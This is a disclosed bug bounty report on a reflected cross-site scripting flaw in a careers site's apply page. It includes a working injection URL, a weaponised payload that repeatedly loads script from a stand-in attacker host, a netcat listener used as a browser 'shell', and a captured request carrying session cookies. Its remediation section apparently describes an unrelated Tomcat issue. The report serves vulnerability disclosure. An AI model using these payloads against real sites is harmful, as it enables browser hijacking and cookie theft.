# [careers.informatica.com] Reflected Cross Site Scripting to XSS Shell Possible

## Report Details
- **Report ID**: 147196
- **URL**: https://hackerone.com/reports/147196
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-06-25T14:28:47.229Z
- **Disclosed**: 2016-12-31T00:20:57.583Z

## Reporter
- **Username**: zephrfish
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
#####Description
Cross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.


#####Issue
The consultant identified that the careers page is vulnerable to reflected cross site scripting, this means that a malicious user can craft a link to compromise a user, the user simple needs to click on the link and the payload is launched. 

----------
#####Affected URLs
    https://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E

From the affected URL it can be seen that the `isJTN` parameter can be given any javascript code or HTML tags and it will execute the code within. The above payload simply launches a prompt box with the consultant's hackerone username ZephrFish. However cross site scripting can be further weaponised to hook a victim's browser and cause further damage. See the proof of concept section below for a full weaponised scenario using this reflected cross site scripting to execute client side code execution.

####Risk: **High**
This issue has been marked as high due to  the risk of compromise being on the user rather than server side, however this should still be considered as an issue and dealt with accordingly, if an attacker is able to compromise a victim's browser they can do far worse than pop an alert message. This is essentially a new form of reflected cross site scripting which is persistent to the user's browser being open.

#####Remediaton
Implement http authentication on the affected directories, or alternatively  remove the examples folder entirely to prevent the attack surface.  Consider following a lockdown procedure against the installation and updating Tomcat to a newer instance. 

#####Weaponising Cross Site Scripting
The following example demonstrates how an attacker can establish a persistent connection to a victim's browser and proceed to execute arbitrary commands on the victim's machine.

**The hook**
The victim receives a malicious link, similar to that shown below:

    https://careers.informatica.com/apply?isJTN=<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//AttackerServerIP:ANYPORT";d.body.appendChild(z)},0)</script>

Attacker Server:
The attacker runs the following code to catch the shell with netcat:

    while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp PORTNUMBER >/dev/null; done

When this link is clicked on the attacker's server will catch a shell and allow the attacker to execute arbitrary commands on the victim's browser as shown in the attached screenshots, these commands can be any javascript commands including theft of cookies, redirection of victim's browser or in some cases malware delivery.

The following shows what is shown on the attacker's server when a valid connection attempt is received:

    [root@inform]# while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp 533 >/dev/null; done
    ZephrFishHackerOne>$ alert('Shell')
    listening on [any] 533 ...
    connect to [ATTACKERIP] from VICTIM HOSTNAME [VICTIM BROWSERIP] 55730
     sent 15, rcvd 245


#####References

 - [OWASP: Cross Site Scripting Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)

#####Request & Response
GET Request

    GET /apply?isJTN=%3Cscript%3Eprompt('ZephrFish')%3C/script%3E HTTP/1.1
    Host: careers.informatica.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Cookie: AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16977%7CMCMID%7C43066833403543674402896414893465241440%7CMCAID%7CNONE%7CMCAAMLH-1467332027%7C6%7CMCAAMB-1467332028%7CNRX38WO0n5BH8Th-nqAG_A; mbox=PC#1466727226198-680058.26_3#1468009316|check#true#1466799776|session#1466799715648-663873#1466801576; s_nr=1466799716120-Repeat; s_vnum=1469319227675%26vn%3D3; mktrest_end_time=1466727232954; mktrest_cookie=anonymous; wooTracker=pFDG1ZqP3HWn; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1466727758906-39922; mrkto_lead="{\"requestId\":\"11ba9#1557fcb4463\",\"result\":[],\"success\":true,\"marketoCall\":\"false\"}"; do_mkto_call=false; _ga=GA1.2.935149421.1466727762
    Connection: close
    

   
Response

    HTTP/1.1 200 OK
    Content-Language: en-US
    Content-Type: text/html;charset=utf-8
    Date: Sat, 25 Jun 2016 14:14:16 GMT
    Server: Apache-Coyote/1.1
    Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
    Vary: Accept-Encoding
    Connection: Close
    Content-Length: 53097
    ---snip---
                var payload = {fileUrl: link, jobSeqNo: jobId, refNum: refNum, isQuickApply: isQuickApply,
                                actualJobId: actualJobId, title: title, location: location,
                                applySource: applySource, applyUrl: applyUrl, category: category, isJTN: "<script>prompt('ZephrFish')</script>",
                                atsApplyDataId:atsApplyDataId,atsApplyStatusId:atsApplyStatusId, applyType: applyType,
                                screenWidth: screen.width, screenHeight: screen.height}
               sendDownloadResume(payload) 
    ---snip---



## Attachments
- xss_shell_career.png
- careers-xss.png
- xss_shell_career-commands.png
